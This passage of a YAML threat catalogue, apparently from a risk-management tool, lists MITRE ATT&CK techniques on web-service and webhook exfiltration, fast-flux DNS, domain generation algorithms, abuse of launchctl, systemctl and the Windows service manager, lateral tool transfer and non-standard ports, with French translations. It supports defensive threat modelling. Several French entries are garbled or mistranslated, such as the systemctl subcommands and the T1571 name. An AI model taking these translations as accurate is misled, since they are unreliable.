      Web services acting as an exfiltration mechanism may give a significant amount
      of cover due to the likelihood that hosts within a network are already communicating
      with them prior to compromise. Firewall rules may also already exist to permit
      traffic to these services.


      Web service providers also commonly use SSL/TLS encryption, giving adversaries
      an added level of protection.

      https://attack.mitre.org/techniques/T1567'
    translations:
      fr:
        name: Exfiltration via le service Web
        description: "Les adversaires peuvent utiliser un service Web externe existant\
          \ et l\xE9gitime pour exfiltrer des donn\xE9es plut\xF4t que leur canal\
          \ principal de commandement et de contr\xF4le. Les services Web populaires\
          \ agissant comme m\xE9canisme d\u2019exfiltration peuvent offrir une couverture\
          \ significative en raison de la probabilit\xE9 que les h\xF4tes d\u2019\
          un r\xE9seau communiquent d\xE9j\xE0 avec eux avant la compromission. Des\
          \ r\xE8gles de pare-feu peuvent \xE9galement d\xE9j\xE0 exister pour permettre\
          \ le trafic vers ces services.\n\nLes fournisseurs de services web utilisent\
          \ \xE9galement couramment le chiffrement SSL/TLS, offrant ainsi aux adversaires\
          \ un niveau de protection suppl\xE9mentaire.\nhttps://attack.mitre.org/techniques/T1567"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567.001
    ref_id: T1567.001
    name: Exfiltration to Code Repository
    description: 'Adversaries may exfiltrate data to a code repository rather than
      over their primary command and control channel. Code repositories are often
      accessible via an API (ex: https://api.github.com). Access to these APIs are
      often over HTTPS, which gives the adversary an additional level of protection.


      Exfiltration to a code repository can also provide a significant amount of cover
      to the adversary if it is a popular service already used by hosts within the
      network.

      https://attack.mitre.org/techniques/T1567/001'
    translations:
      fr:
        name: "Exfiltration vers le d\xE9p\xF4t de code"
        description: "Les adversaires peuvent exfiltrer les donn\xE9es vers un d\xE9\
          p\xF4t de code plut\xF4t que via leur canal principal de commandement et\
          \ de contr\xF4le. Les d\xE9p\xF4ts de code sont souvent accessibles via\
          \ une API (ex : https://api.github.com). L\u2019acc\xE8s \xE0 ces API se\
          \ fait souvent via HTTPS, ce qui conf\xE8re \xE0 l\u2019adversaire un niveau\
          \ de protection suppl\xE9mentaire.\n\nL\u2019exfiltration vers un d\xE9\
          p\xF4t de code peut \xE9galement offrir une couverture significative \xE0\
          \ l\u2019adversaire si c\u2019est un service d\xE9j\xE0 populaire utilis\xE9\
          \ par les h\xF4tes du r\xE9seau.\nhttps://attack.mitre.org/techniques/T1567/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567.002
    ref_id: T1567.002
    name: Exfiltration to Cloud Storage
    description: 'Adversaries may exfiltrate data to a cloud storage service rather
      than over their primary command and control channel. Cloud storage services
      allow for the storage, edit, and retrieval of data from a remote cloud storage
      server over the Internet.


      Examples of cloud storage services include Dropbox and Google Docs. Exfiltration
      to these cloud storage services can provide a significant amount of cover to
      the adversary if hosts within the network are already communicating with the
      service.

      https://attack.mitre.org/techniques/T1567/002'
    translations:
      fr:
        name: Exfiltration vers le stockage cloud
        description: "Les adversaires peuvent exfiltrer les donn\xE9es vers un service\
          \ de stockage cloud plut\xF4t que via leur canal principal de commandement\
          \ et de contr\xF4le. Les services de stockage cloud permettent le stockage,\
          \ l\u2019\xE9dition et la r\xE9cup\xE9ration de donn\xE9es depuis un serveur\
          \ de stockage cloud distant via Internet.\n\nDes exemples de services de\
          \ stockage cloud incluent Dropbox et Google Docs. L\u2019exfiltration vers\
          \ ces services de stockage cloud peut offrir une couverture significative\
          \ \xE0 l\u2019adversaire si les h\xF4tes du r\xE9seau communiquent d\xE9\
          j\xE0 avec le service.\nhttps://attack.mitre.org/techniques/T1567/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567.003
    ref_id: T1567.003
    name: Exfiltration to Text Storage Sites
    description: "Adversaries may exfiltrate data to text storage sites instead of\
      \ their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>,\
      \ are commonly used by developers to share code and other information.  \n\n\
      Text storage sites are often used to host malicious code for C2 communication\
      \ (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but\
      \ adversaries may also use these sites to exfiltrate collected data. Furthermore,\
      \ paid features and encryption options may allow adversaries to conceal and\
      \ store data more securely.(Citation: Pastebin EchoSec)\n\n**Note:** This is\
      \ distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001),\
      \ which highlight access to code repositories via APIs.\nhttps://attack.mitre.org/techniques/T1567/003"
    translations:
      fr:
        name: Exfiltration vers les sites de stockage de texte
        description: "Les adversaires peuvent exfiltrer les donn\xE9es vers des sites\
          \ de stockage de texte au lieu de leur canal principal de commandement et\
          \ de contr\xF4le. Sites de stockage de texte, tels que <code>pastebin[.]com</code>,\
          \ sont couramment utilis\xE9s par les d\xE9veloppeurs pour partager du code\
          \ et d\u2019autres informations.  \n\nLes sites de stockage de texte sont\
          \ souvent utilis\xE9s pour h\xE9berger du code malveillant pour la communication\
          \ C2 (par exemple, [Stage Capabilities](https://attack.mitre.org/techniques/T1608)),\
          \ mais les adversaires peuvent aussi utiliser ces sites pour exfiltrer les\
          \ donn\xE9es collect\xE9es. De plus, des fonctionnalit\xE9s payantes et\
          \ des options de chiffrement peuvent permettre aux adversaires de dissimuler\
          \ et stocker les donn\xE9es de mani\xE8re plus s\xE9curis\xE9e. (Citation\
          \ : Pastebin EchoSec)\n\n**Note :** Ceci est distinct de [Exfiltration vers\
          \ le d\xE9p\xF4t de code](https://attack.mitre.org/techniques/T1567/001),\
          \ qui met en avant l\u2019acc\xE8s aux d\xE9p\xF4ts de code via des API.\n\
          https://attack.mitre.org/techniques/T1567/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567.004
    ref_id: T1567.004
    name: Exfiltration Over Webhook
    description: "Adversaries may exfiltrate data to a webhook endpoint rather than\
      \ over their primary command and control channel. Webhooks are simple mechanisms\
      \ for allowing a server to push data over HTTP/S to a client without the need\
      \ for the client to continuously poll the server.(Citation: RedHat Webhooks)\
      \ Many public and commercial services, such as Discord, Slack, and `webhook.site`,\
      \ support the creation of webhook endpoints that can be used by other services,\
      \ such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When\
      \ changes happen in the linked services (such as pushing a repository update\
      \ or modifying a ticket), these services will automatically post the data to\
      \ the webhook endpoint for use by the consuming application. \n\nAdversaries\
      \ may link an adversary-owned environment to a victim-owned SaaS service to\
      \ achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020)\
      \ of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks\
      \ Repository Webhooks) Alternatively, instead of linking the webhook endpoint\
      \ to a service, an adversary can manually post staged data directly to the URL\
      \ in order to exfiltrate it.(Citation: Microsoft SQL Server)\n\nAccess to webhook\
      \ endpoints is often over HTTPS, which gives the adversary an additional level\
      \ of protection. Exfiltration leveraging webhooks can also blend in with normal\
      \ network traffic if the webhook endpoint points to a commonly used SaaS application\
      \ or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos\
      \ Discord Webhook Abuse)(Citation: Checkmarx Webhooks)\nhttps://attack.mitre.org/techniques/T1567/004"
    translations:
      fr:
        name: Exfiltration via Webhook
        description: "Les adversaires peuvent exfiltrer les donn\xE9es vers un point\
          \ de terminaison webhook plut\xF4t que via leur canal principal de commandement\
          \ et de contr\xF4le. Les webhooks sont des m\xE9canismes simples permettant\
          \ \xE0 un serveur de transmettre des donn\xE9es via HTTP/S \xE0 un client\
          \ sans que ce dernier ait besoin de sonder continuellement le serveur. (Citation\
          \ : RedHat Webhooks) De nombreux services publics et commerciaux, tels que\
          \ Discord, Slack et \xAB webhook.site \xBB, permettent la cr\xE9ation de\
          \ points de terminaison webhook pouvant \xEAtre utilis\xE9s par d\u2019\
          autres services, tels que Github, Jira ou Trello. (Citation : Introduction\
          \ Discord aux Webhooks) Lorsque des modifications surviennent dans les services\
          \ li\xE9s (comme la mise \xE0 jour d\u2019un d\xE9p\xF4t ou la modification\
          \ d\u2019un ticket), ces services publient automatiquement les donn\xE9\
          es sur le point de terminaison webhook pour \xEAtre utilis\xE9es par l\u2019\
          application consommatrice. \n\nLes adversaires peuvent lier un environnement\
          \ appartenant \xE0 l\u2019adversaire \xE0 un service SaaS d\xE9tenu par\
          \ la victime afin d\u2019effectuer une [Exfiltration automatis\xE9e](https://attack.mitre.org/techniques/T1020)\
          \ r\xE9p\xE9t\xE9e des e-mails, messages de discussion et autres donn\xE9\
          es. (Citation : Push Cybers Cybers Attaques SaaS sur les webhooks du d\xE9\
          p\xF4t SaaS) Sinon, au lieu de lier le point d\u2019extr\xE9mit\xE9 webhook\
          \ \xE0 un service, un adversaire peut envoyer manuellement des donn\xE9\
          es en \xE9tapes directement \xE0 l\u2019URL afin de les exfiltrer. (Citation\
          \ : Microsoft SQL Server)\n\nL\u2019acc\xE8s aux points d\u2019acc\xE8s\
          \ webhook se fait souvent via HTTPS, ce qui offre \xE0 l\u2019adversaire\
          \ un niveau de protection suppl\xE9mentaire. L\u2019exfiltration utilisant\
          \ les webhooks peut \xE9galement se fondre dans le trafic r\xE9seau normal\
          \ si le point de terminaison webhook pointe vers une application SaaS couramment\
          \ utilis\xE9e ou un service de collaboration. (Citation : Discord de CyberArk\
          \ Labs)(Citation : Abus du webhook Discord de Talos)(Citation : Checkmarx\
          \ Webhooks)\nhttps://attack.mitre.org/techniques/T1567/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568
    ref_id: T1568
    name: Dynamic Resolution
    description: 'Adversaries may dynamically establish connections to command and
      control infrastructure to evade common detections and remediations. This may
      be achieved by using malware that shares a common algorithm with the infrastructure
      the adversary uses to receive the malware''s communications. These calculations
      can be used to dynamically adjust parameters such as the domain name, IP address,
      or port number the malware uses for command and control.


      Adversaries may use dynamic resolution for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008).
      When contact is lost with the primary command and control server malware may
      employ dynamic resolution as a means to reestablishing command and control.(Citation:
      Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit
      2017 Activity)

      https://attack.mitre.org/techniques/T1568'
    translations:
      fr:
        name: "R\xE9solution dynamique"
        description: "Les adversaires peuvent \xE9tablir dynamiquement des connexions\
          \ avec les infrastructures de commandement et de contr\xF4le pour \xE9chapper\
          \ aux d\xE9tections et corrections courantes. Cela peut \xEAtre r\xE9alis\xE9\
          \ en utilisant des logiciels malveillants partageant un algorithme commun\
          \ avec l\u2019infrastructure que l\u2019adversaire utilise pour recevoir\
          \ les communications du malware. Ces calculs peuvent \xEAtre utilis\xE9\
          s pour ajuster dynamiquement des param\xE8tres tels que le nom de domaine,\
          \ l\u2019adresse IP ou le num\xE9ro de port utilis\xE9 par le malware pour\
          \ la commande et le contr\xF4le.\n\nLes adversaires peuvent utiliser la\
          \ r\xE9solution dynamique \xE0 des fins de [Canaux de secours](https://attack.mitre.org/techniques/T1008).\
          \ Lorsque le contact avec le serveur principal de commande et de contr\xF4\
          le est perdu, un malware peut utiliser la r\xE9solution dynamique comme\
          \ moyen de r\xE9tablir le commandement et le contr\xF4le. (Citation : Talos\
          \ CCleanup 2017)(Citation : FireEye POSHSPY avril 2017)(Citation : Activit\xE9\
          \ ESET Sednit 2017)\nhttps://attack.mitre.org/techniques/T1568"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568.001
    ref_id: T1568.001
    name: Fast Flux DNS
    description: 'Adversaries may use Fast Flux DNS to hide a command and control
      channel behind an array of rapidly changing IP addresses linked to a single
      domain resolution. This technique uses a fully qualified domain name, with multiple
      IP addresses assigned to it which are swapped with high frequency, using a combination
      of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource
      record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast
      Flux - Welivesecurity)


      The simplest, "single-flux" method, involves registering and de-registering
      an addresses as part of the DNS A (address) record list for a single DNS name.
      These registrations have a five-minute average lifespan, resulting in a constant
      shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)


      In contrast, the "double-flux" method registers and de-registers an address
      as part of the DNS Name Server record list for the DNS zone, providing additional
      resilience for the connection. With double-flux additional hosts can act as
      a proxy to the C2 host, further insulating the true source of the C2 channel.

      https://attack.mitre.org/techniques/T1568/001'
    translations:
      fr:
        name: DNS Flux rapide
        description: "Les adversaires peuvent utiliser Fast Flux DNS pour dissimuler\
          \ un canal de commande et de contr\xF4le derri\xE8re un tableau d\u2019\
          adresses IP changeantes rapidement li\xE9es \xE0 une seule r\xE9solution\
          \ de domaine. Cette technique utilise un nom de domaine enti\xE8rement qualifi\xE9\
          , avec plusieurs adresses IP attribu\xE9es qui sont \xE9chang\xE9es \xE0\
          \ grande fr\xE9quence, en combinant un adressage IP en round robin et un\
          \ court Time-To-Live (TTL) pour un enregistrement de ressources DNS. (Citation\
          \ : MehtaFastFluxPt1)(Citation : MehtaFastFluxPt2)(Citation : Flux rapide\
          \ - Welivesecurity)\n\nLa m\xE9thode la plus simple, \xAB flux unique \xBB\
          , consiste \xE0 enregistrer et d\xE9sinscrire une adresse dans la liste\
          \ d\u2019enregistrements DNS A (adresse) pour un nom DNS unique. Ces enregistrements\
          \ ont une dur\xE9e de vie moyenne de cinq minutes, ce qui entra\xEEne un\
          \ m\xE9lange constant de la r\xE9solution des adresses IP. (Citation : Flux\
          \ rapide - Welivesecurity)\n\nEn revanche, la m\xE9thode \xAB double-flux\
          \ \xBB enregistre et d\xE9sinscrit une adresse dans la liste d\u2019enregistrements\
          \ du serveur de noms DNS pour la zone DNS, offrant ainsi une r\xE9silience\
          \ suppl\xE9mentaire \xE0 la connexion. Avec le double flux, des h\xF4tes\
          \ suppl\xE9mentaires peuvent agir comme un substitut de l\u2019h\xF4te C2,\
          \ isolant davantage la v\xE9ritable source du canal C2.\nhttps://attack.mitre.org/techniques/T1568/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568.002
    ref_id: T1568.002
    name: Domain Generation Algorithms
    description: "Adversaries may make use of Domain Generation Algorithms (DGAs)\
      \ to dynamically identify a destination domain for command and control traffic\
      \ rather than relying on a list of static IP addresses or domains. This has\
      \ the advantage of making it much harder for defenders to block, track, or take\
      \ over the command and control channel, as there potentially could be thousands\
      \ of domains that malware can check for instructions.(Citation: Cybereason Dissecting\
      \ DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs\
      \ can take the form of apparently random or \u201Cgibberish\u201D strings (ex:\
      \ istgmxdejdnxuyla.ru) when they construct domain names by generating each letter.\
      \ Alternatively, some DGAs employ whole words as the unit by concatenating words\
      \ together instead of letters (ex: cityjulydish.net). Many DGAs are time-based,\
      \ generating a different domain for each time period (hourly, daily, monthly,\
      \ etc). Others incorporate a seed value as well to make predicting future domains\
      \ more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation:\
      \ Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\
      \nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008).\
      \ When contact is lost with the primary command and control server malware may\
      \ employ a DGA as a means to reestablishing command and control.(Citation: Talos\
      \ CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit\
      \ 2017 Activity)\nhttps://attack.mitre.org/techniques/T1568/002"
    translations:
      fr:
        name: "Algorithmes de g\xE9n\xE9ration de domaines"
        description: "Les adversaires peuvent utiliser des algorithmes de g\xE9n\xE9\
          ration de domaines (DGA) pour identifier dynamiquement un domaine de destination\
          \ pour le trafic de commande et de contr\xF4le, plut\xF4t que de se fier\
          \ \xE0 une liste d\u2019adresses IP ou de domaines statiques. Cela a l\u2019\
          avantage de rendre beaucoup plus difficile pour les d\xE9fenseurs de bloquer,\
          \ de suivre ou de prendre le contr\xF4le du canal de commandement et de\
          \ contr\xF4le, car il pourrait potentiellement exister des milliers de domaines\
          \ que les malwares peuvent v\xE9rifier pour les instructions. (Citation\
          \ : Cybereason diss\xE9quant les DGA)(Citation : Cisco Umbrella DGA)(Citation\
          \ : Unit\xE9 42 DGA f\xE9vrier 2019)\n\nLes DGA peuvent prendre la forme\
          \ de cha\xEEnes apparemment al\xE9atoires ou \xAB charabia \xBB (ex : istgmxdejdnxuyla.ru)\
          \ lorsqu\u2019elles construisent des noms de domaine en g\xE9n\xE9rant chaque\
          \ lettre. Alternativement, certaines DGA utilisent des mots entiers comme\
          \ unit\xE9 en concat\xE9nant des mots au lieu de lettres (ex : cityjulydish.net).\
          \ Beaucoup de DGA sont bas\xE9s sur le temps, g\xE9n\xE9rant un domaine\
          \ diff\xE9rent pour chaque p\xE9riode (horaire, journalier, mensuel, etc.).\
          \ D\u2019autres int\xE8grent \xE9galement une valeur de d\xE9part pour rendre\
          \ la pr\xE9vision des domaines futurs plus difficile pour les d\xE9fenseurs.\
          \ (Citation : Cybereason diss\xE9quant les DGA)(Citation : Cisco Umbrella\
          \ DGA)(Citation : Talos CCleanup 2017)(Citation : Att\xE9nuation DGA d\u2019\
          Akamai)\n\nLes adversaires peuvent utiliser les DGA \xE0 des fins de [Canaux\
          \ de secours](https://attack.mitre.org/techniques/T1008). Lorsque le contact\
          \ avec le serveur principal de commande et de contr\xF4le est perdu, un\
          \ malware peut utiliser une DGA comme moyen de r\xE9tablir le commandement\
          \ et le contr\xF4le. (Citation : Talos CCleanup 2017)(Citation : FireEye\
          \ POSHSPY avril 2017)(Citation : Activit\xE9 ESET Sednit 2017)\nhttps://attack.mitre.org/techniques/T1568/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568.003
    ref_id: T1568.003
    name: DNS Calculation
    description: 'Adversaries may perform calculations on addresses returned in DNS
      results to determine which port and IP address to use for command and control,
      rather than relying on a predetermined port number or the actual returned IP
      address. A IP and/or port number calculation can be used to bypass egress filtering
      on a C2 channel.(Citation: Meyers Numbered Panda)


      One implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003)
      is to take the first three octets of an IP address in a DNS response and use
      those values to calculate the port for command and control traffic.(Citation:
      Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)'
    translations:
      fr:
        name: Calcul DNS
        description: "Les adversaires peuvent effectuer des calculs sur les adresses\
          \ retourn\xE9es dans les r\xE9sultats DNS afin de d\xE9terminer quel port\
          \ et quelle adresse IP utiliser pour la commande et le contr\xF4le, plut\xF4\
          t que de se fier \xE0 un num\xE9ro de port pr\xE9d\xE9termin\xE9 ou \xE0\
          \ l\u2019adresse IP r\xE9ellement retourn\xE9e. Un calcul IP et/ou du num\xE9\
          ro de port peut \xEAtre utilis\xE9 pour contourner le filtrage d\u2019\xE9\
          vacuation sur un canal C2. (Citation : Panda num\xE9rot\xE9 par Meyers)\n\
          \nUne impl\xE9mentation de [DNS Calculation](https://attack.mitre.org/techniques/T1568/003)\
          \ consiste \xE0 prendre les trois premiers octets d\u2019une adresse IP\
          \ dans une r\xE9ponse DNS et \xE0 utiliser ces valeurs pour calculer le\
          \ port du trafic de commande et de contr\xF4le. (Citation : Panda num\xE9\
          rot\xE9 par Meyers)(Citation : Moran 2014)(Citation : Rapid7G20Espionage)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1569
    ref_id: T1569
    name: System Services
    description: 'Adversaries may abuse system services or daemons to execute commands
      or programs. Adversaries can execute malicious content by interacting with or
      creating services either locally or remotely. Many services are set to run at
      boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)),
      but adversaries can also abuse services for one-time or temporary execution.

      https://attack.mitre.org/techniques/T1569'
    translations:
      fr:
        name: "Services syst\xE8me"
        description: "Les adversaires peuvent abuser des services syst\xE8me ou des\
          \ d\xE9mons pour ex\xE9cuter des commandes ou des programmes. Les adversaires\
          \ peuvent ex\xE9cuter du contenu malveillant en interagissant ou en cr\xE9\
          ant des services localement ou \xE0 distance. De nombreux services sont\
          \ configur\xE9s pour s\u2019ex\xE9cuter au d\xE9marrage, ce qui peut aider\
          \ \xE0 obtenir la persistance ([Cr\xE9er ou modifier le processus syst\xE8\
          me](https://attack.mitre.org/techniques/T1543)), mais les adversaires peuvent\
          \ aussi abuser des services pour une ex\xE9cution unique ou temporaire.\n\
          https://attack.mitre.org/techniques/T1569"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1569.001
    ref_id: T1569.001
    name: Launchctl
    description: 'Adversaries may abuse launchctl to execute commands or programs.
      Launchctl interfaces with launchd, the service management framework for macOS.
      Launchctl supports taking subcommands on the command-line, interactively, or
      even redirected from standard input.(Citation: Launchctl Man)


      Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s
      or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands
      include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl
      start</code>. Adversaries can use scripts or manually run the commands <code>launchctl
      load -w "%s/Library/LaunchAgents/%s"</code> or <code>/bin/launchctl load</code>
      to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or
      [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy
      Komplex Trojan)(Citation: 20 macOS Common Tools and Techniques)

      https://attack.mitre.org/techniques/T1569/001'
    translations:
      fr:
        name: Launchctl
        description: "Les adversaires peuvent abuser de launchctl pour ex\xE9cuter\
          \ des commandes ou des programmes. Launchctl s\u2019interface avec launchd,\
          \ le cadre de gestion de service pour macOS. Launchctl prend en charge la\
          \ prise en charge des sous-commandes en ligne de commande, de mani\xE8re\
          \ interactive, voire redirig\xE9e depuis une entr\xE9e standard. (Citation\
          \ : Launchctl Man)\n\nLes adversaires utilisent launchctl pour ex\xE9cuter\
          \ des commandes et des programmes en tant que [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s\
          \ ou [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Les\
          \ sous-commandes courantes incluent : <code>launchctl load</code>, <code>launchctl\
          \ unload</code> et <code>launchctl start</code>. Les adversaires peuvent\
          \ utiliser des scripts ou ex\xE9cuter manuellement les commandes <code>launchctl\
          \ load -w \xAB\_%s/Library/LaunchAgents/\_%s\_\xBB</code> ou <code>/bin/launchctl\
          \ load</code> pour ex\xE9cuter [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s\
          \ ou [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. (Citation\
          \ : Sofacy Komplex Trojan)(Citation : 20 outils et techniques communs sur\
          \ macOS)\nhttps://attack.mitre.org/techniques/T1569/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1569.002
    ref_id: T1569.002
    name: Service Execution
    description: 'Adversaries may abuse the Windows service control manager to execute
      malicious commands or payloads. The Windows service control manager (<code>services.exe</code>)
      is an interface to manage and manipulate services.(Citation: Microsoft Service
      Control Manager) The service control manager is accessible to users via GUI
      components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).


      [PsExec](https://attack.mitre.org/software/S0029) can also be used to execute
      commands or payloads via a temporary Windows service created through the service
      control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029)
      and <code>sc.exe</code> can accept remote servers as arguments and may be used
      to conduct remote execution.


      Adversaries may leverage these mechanisms to execute malicious content. This
      can be done by either executing a new or modified service. This technique is
      the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003)
      during service persistence or privilege escalation.

      https://attack.mitre.org/techniques/T1569/002'
    translations:
      fr:
        name: "Ex\xE9cution du service"
        description: "Les adversaires peuvent abuser du gestionnaire de contr\xF4\
          le de service Windows pour ex\xE9cuter des commandes ou des charges utiles\
          \ malveillantes. Le gestionnaire de contr\xF4le des services Windows (<code>services.exe</code>)\
          \ est une interface pour g\xE9rer et manipuler des services. (Citation :\
          \ Microsoft Service Control Manager) Le gestionnaire de contr\xF4le de service\
          \ est accessible aux utilisateurs via des composants GUI ainsi que des utilitaires\
          \ syst\xE8me tels que <code>sc.exe</code> et [Net](https://attack.mitre.org/software/S0039).\n\
          \n[PsExec](https://attack.mitre.org/software/S0029) peut \xE9galement \xEA\
          tre utilis\xE9 pour ex\xE9cuter des commandes ou des charges utiles via\
          \ un service Windows temporaire cr\xE9\xE9 via l\u2019API du gestionnaire\
          \ de contr\xF4le des services. (Citation : Russinovich Sysinternals) Des\
          \ outils tels que [PsExec](https://attack.mitre.org/software/S0029) et <code>sc.exe</code>\
          \ peuvent accepter des serveurs distants comme arguments et peuvent \xEA\
          tre utilis\xE9s pour effectuer des ex\xE9cutions \xE0 distance.\n\nLes adversaires\
          \ peuvent utiliser ces m\xE9canismes pour ex\xE9cuter des contenus malveillants.\
          \ Cela peut se faire en ex\xE9cutant un service nouveau ou modifi\xE9. Cette\
          \ technique est l\u2019ex\xE9cution utilis\xE9e conjointement avec [Windows\
          \ Service](https://attack.mitre.org/techniques/T1543/003) lors de la persistance\
          \ du service ou de l\u2019escalade de privil\xE8ges.\nhttps://attack.mitre.org/techniques/T1569/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1569.003
    ref_id: T1569.003
    name: Systemctl
    description: "Adversaries may abuse systemctl to execute commands or programs.\
      \ Systemctl is the primary interface for systemd, the Linux init system and\
      \ service manager. Typically invoked from a shell, Systemctl can also be integrated\
      \ into scripts or applications.   \n\nAdversaries may use systemctl to execute\
      \ commands or programs as [Systemd Service](https://attack.mitre.org/techniques/T1543/002)s.\
      \ Common subcommands include: `systemctl start`, `systemctl stop`, `systemctl\
      \ enable`, `systemctl disable`, and `systemctl status`.(Citation: Red Hat Systemctl\
      \ 2022)\nhttps://attack.mitre.org/techniques/T1569/003"
    translations:
      fr:
        name: Systemctl
        description: "Les adversaires peuvent abuser du systemctl pour ex\xE9cuter\
          \ des commandes ou des programmes. Systemctl est l\u2019interface principale\
          \ pour systemd, le syst\xE8me d\u2019initiation Linux et le gestionnaire\
          \ de service. G\xE9n\xE9ralement invoqu\xE9 depuis un shell, Systemctl peut\
          \ \xE9galement \xEAtre int\xE9gr\xE9 dans des scripts ou des applications.\
          \   \n\nLes adversaires peuvent utiliser systemctl pour ex\xE9cuter des\
          \ commandes ou des programmes sous forme de [Service[Systemd](https://attack.mitre.org/techniques/T1543/002).\
          \ Les sous-commandes courantes incluent : \xAB starter systemctl \xBB, \xAB\
          \ arr\xEAt systl \xBB, \xAB activer systl \xBB, \xAB d\xE9sactiver systcl\
          \ \xBB et \xAB statut systcl \xBB. (Citation : Red Hat Systemctl 2022)\n\
          https://attack.mitre.org/techniques/T1569/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1570
    ref_id: T1570
    name: Lateral Tool Transfer
    description: 'Adversaries may transfer tools or other files between systems in
      a compromised environment. Once brought into the victim environment (i.e., [Ingress
      Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be
      copied from one system to another to stage adversary tools or other files over
      the course of an operation.


      Adversaries may copy files between internal victim systems to support lateral
      movement using inherent file sharing protocols such as file sharing over [SMB/Windows
      Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network
      shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation:
      Unit42 LockerGoga 2019)


      Files can also be transferred using native or otherwise present tools on the
      victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).
      In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s
      such as Dropbox or OneDrive to copy files from one machine to another via shared,
      automatically synced folders.(Citation: Dropbox Malware Sync)

      https://attack.mitre.org/techniques/T1570'
    translations:
      fr:
        name: "Transfert lat\xE9ral d\u2019outils"
        description: "Les adversaires peuvent transf\xE9rer des outils ou d\u2019\
          autres fichiers entre syst\xE8mes dans un environnement compromis. Une fois\
          \ int\xE9gr\xE9s dans l\u2019environnement victime (c\u2019est-\xE0-dire\
          \ [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), les\
          \ fichiers peuvent alors \xEAtre copi\xE9s d\u2019un syst\xE8me \xE0 un\
          \ autre pour organiser des outils adverses ou d\u2019autres fichiers au\
          \ cours d\u2019une op\xE9ration.\n\nLes adversaires peuvent copier des fichiers\
          \ entre syst\xE8mes internes victimes pour soutenir le d\xE9placement lat\xE9\
          ral en utilisant des protocoles de partage de fichiers inh\xE9rents tels\
          \ que le partage de fichiers via [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002)\
          \ vers des partages r\xE9seau connect\xE9s ou avec des connexions authentifi\xE9\
          es via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).\
          \ (Citation : Unit42 LockerGoga 2019)\n\nLes fichiers peuvent \xE9galement\
          \ \xEAtre transf\xE9r\xE9s \xE0 l\u2019aide d\u2019outils natifs ou pr\xE9\
          sents sur le syst\xE8me victime, tels que scp, rsync, curl, sftp et [ftp](https://attack.mitre.org/software/S0095).\
          \ Dans certains cas, les adversaires peuvent utiliser des [Web Service](https://attack.mitre.org/techniques/T1102)\
          \ comme Dropbox ou OneDrive pour copier des fichiers d\u2019une machine\
          \ \xE0 une autre via des dossiers partag\xE9s et synchronis\xE9s automatiquement.\
          \ (Citation : Synchronisation du malware Dropbox)\nhttps://attack.mitre.org/techniques/T1570"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1571
    ref_id: T1571
    name: Non-Standard Port
    description: 'Adversaries may communicate using a protocol and port pairing that
      are typically not associated. For example, HTTPS over port 8088(Citation: Symantec
      Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed
      to the traditional port 443. Adversaries may make changes to the standard port
      used by a protocol to bypass filtering or muddle analysis/parsing of network
      data.


      Adversaries may also make changes to victim systems to abuse non-standard ports.
      For example, Registry keys and other configuration settings can be used to modify
      protocol and port pairings.(Citation: change_rdp_port_conti)

      https://attack.mitre.org/techniques/T1571'
    translations:
      fr:
        name: Transfert non standard
